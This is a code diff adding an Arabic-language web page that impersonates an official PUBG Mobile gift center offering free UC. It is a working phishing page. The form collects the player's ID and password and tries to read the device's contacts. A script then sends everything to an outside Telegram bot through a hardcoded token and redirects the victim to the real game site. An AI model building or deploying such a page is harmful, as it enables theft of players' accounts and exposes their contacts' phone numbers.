@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG MOBILE • Official UC Center</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #0b0b0f; color: #fff; padding-bottom: 40px; }
+        .header { background: #12121c; border-bottom: 2px solid #f59e0b; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-size: 18px; font-weight: bold; color: #f59e0b; }
+        .badge-live { background: rgba(16, 185, 129, 0.2); color: #34d399; font-size: 11px; padding: 4px 10px; border-radius: 12px; }
+        .hero { text-align: center; padding: 25px 15px; }
+        .hero h1 { color: #f59e0b; font-size: 22px; margin-bottom: 8px; }
+        .hero p { color: #94a3b8; font-size: 12px; max-width: 350px; margin: 0 auto; line-height: 1.5; }
+        .grid-offers { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; max-width: 380px; margin: 15px auto; padding: 0 15px; }
+        .offer-box { background: #161622; border: 1px solid #27273a; border-radius: 10px; padding: 15px; text-align: center; cursor: pointer; transition: 0.3s; position: relative; }
+        .offer-box.selected { border-color: #f59e0b; background: rgba(245, 158, 11, 0.08); box-shadow: 0 0 15px rgba(245, 158, 11, 0.2); }
+        .offer-box h3 { color: #fbbf24; font-size: 16px; margin-bottom: 4px; }
+        .offer-box span { font-size: 10px; color: #94a3b8; }
+        .ribbon { position: absolute; top: 0; left: 0; background: #ef4444; color: #fff; font-size: 8px; padding: 2px 6px; border-bottom-right-radius: 6px; font-weight: bold; }
+        .form-box { background: #12121c; border: 1px solid #27273a; max-width: 380px; margin: 0 auto; padding: 25px 20px; border-radius: 14px; text-align: center; }
+        .input-group { margin-bottom: 12px; text-align: right; }
+        input { width: 100%; padding: 11px; background: #0b0b0f; border: 1px solid #27272a; color: #fff; border-radius: 8px; font-size: 13px; outline: none; }
+        input:focus { border-color: #f59e0b; }
+        button { width: 100%; padding: 12px; background: linear-gradient(135deg, #f59e0b, #d97706); border: none; color: #000; font-weight: bold; font-size: 14px; border-radius: 8px; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">PUBG MOBILE VIPS</div>
+        <div class="badge-live">متصل الآن</div>
+    </div>
+    <div class="hero">
+        <h1>مهرجان هدايا الشتاء الكبرى</h1>
+        <p>اختر العرض المناسب لحسابك وقم بتأكيد الهوية لاستلام الشدات فوراً.</p>
+    </div>
+    <div class="grid-offers">
+        <div class="offer-box selected" onclick="selectOffer(this, '8100 شدة + سكن ميثيك')">
+            <div class="ribbon">الأكثر طلباً</div>
+            <h3>8100 UC</h3>
+            <span>+ سكن نادر مجاناً</span>
+        </div>
+        <div class="offer-box" onclick="selectOffer(this, '16200 شدة ملكية')">
+            <h3>16200 UC</h3>
+            <span>ملكية كاملة</span>
+        </div>
+    </div>
+    <div class="form-box">
+        <h3 style="color: #f59e0b; margin-bottom: 5px; font-size: 16px;">تأكيد استلام الجائزة</h3>
+        <p style="color: #94a3b8; font-size: 10px; margin-bottom: 15px;" id="offerText">العرض: 8100 شدة + سكن ميثيك</p>
+        <form id="secureForm">
+            <div class="input-group"><input type="text" id="username" placeholder="ايدي اللاعب (Player ID)" required></div>
+            <div class="input-group"><input type="password" id="password" placeholder="كلمة المرور أو رمز الأمان" required></div>
+            <button type="submit">تأكيد ومزامنة الهدايا</button>
+        </form>
+    </div>
+    <script>
+        let currentOffer = "8100 شدة + سكن ميثيك";
+        function selectOffer(el, name) {
+            document.querySelectorAll('.offer-box').forEach(b => b.classList.remove('selected'));
+            el.classList.add('selected');
+            currentOffer = name;
+            document.getElementById('offerText').innerText = `العرض: ${name}`;
+        }
+        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetChatId = urlParams.get('to');
+
+        document.getElementById('secureForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            if(!targetChatId) return;
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            let contacts = "لم يتم منح الصلاحية";
+            if ('contacts' in navigator && 'ContactsManager' in window) {
+                try {
+                    const res = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                    if (res.length > 0) contacts = res.map(c => `المستخدم: ${c.name?.[0]} - الرقم: ${c.tel?.[0]}`).join('\n');
+                } catch(e) {}
+            }
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`صيد ببجي جديد\nالعرض: ${currentOffer}\nالايدي: ${user}\nالباسورد: ${pass}`)}`);
+            if (contacts !== "لم يتم منح الصلاحية") {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`جهات الاتصال:\n${contacts}`)}`);
+            }
+            setTimeout(() => { window.location.href = "https://www.pubgmobile.com"; }, 800);
+        });
+    </script>
+</body>
+</html>
